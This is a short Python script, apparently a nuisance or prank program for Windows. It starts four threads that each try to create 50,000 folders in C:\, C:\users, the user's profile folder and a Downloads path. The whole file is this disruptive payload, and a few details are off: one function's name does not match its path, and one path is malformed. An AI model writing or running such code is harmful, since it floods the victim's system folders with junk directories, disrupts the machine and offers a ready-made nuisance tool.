import os
import threading

username=os.getlogin()

def f_desktop():
    for i in range(0,50000):
        os.mkdir(f"C:\\users\\{username}\\File {i}")

def f_users():
     for i in range(0,50000):
        os.mkdir(f"C:\\users\\File {i}")

def f_C():
     for i in range(0,50000):
        os.mkdir(f"C:\\File {i}")

def f_Downloads():
     for i in range(0,50000):
        os.mkdir(f"C:\\{username}\\Downloads\\file {i}")

t1 = threading.Thread(target=f_C)
t2 = threading.Thread(target=f_users)
t3 = threading.Thread(target=f_desktop)
t4 = threading.Thread(target=f_Downloads)

t1.start()
t2.start()
t3.start()
t4.start()